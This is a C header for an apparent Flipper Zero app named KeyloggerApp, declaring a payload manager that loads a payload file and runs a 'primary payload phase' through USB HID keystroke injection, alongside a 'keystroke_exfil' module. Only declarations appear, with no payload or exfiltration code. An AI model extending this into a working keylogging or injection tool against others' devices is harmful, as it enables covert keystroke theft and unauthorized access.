#pragma once

#include <furi.h>
#include "keystroke_exfil.h"
#include "progress_view.h" // For progress callback type

typedef struct KeyloggerApp KeyloggerApp; // Forward declaration from main app

typedef struct PayloadManager PayloadManager;

/**
 * Allocate and initialize a new PayloadManager.
 * @param app_context Pointer to the main application context (KeyloggerApp).
 * @return Pointer to the newly allocated PayloadManager.
 */
PayloadManager* payload_manager_alloc(KeyloggerApp* app_context);

/**
 * Frees the PayloadManager and cleans up resources.
 * @param manager Pointer to the PayloadManager.
 */
void payload_manager_free(PayloadManager* manager);

/**
 * Cleanup function to restore USB mode (call when app exits unexpectedly).
 * @param manager Pointer to the PayloadManager.
 */
void payload_manager_cleanup(PayloadManager* manager);

/**
 * Sets the path for the primary payload.
 * @param manager Pointer to the PayloadManager.
 * @param path Path to the primary payload file.
 */
void payload_manager_set_primary_payload_path(PayloadManager* manager, const char* path);

/**
 * Executes the primary payload phase via USB HID.
 * @param manager Pointer to the PayloadManager.
 * @param use_usb True if USB HID is the selected connection type.
 * @param progress_view_set_status_callback Function to update progress status.
 * @param progress_view_ctx Context for the progress callback.
 * @return True if primary payload phase is considered successful, false otherwise.
 */
bool payload_manager_execute_primary_phase(
    PayloadManager* manager, 
    bool use_usb,
    void (*progress_view_set_status_callback)(void* ctx, const char* status),
    void* progress_view_ctx
); 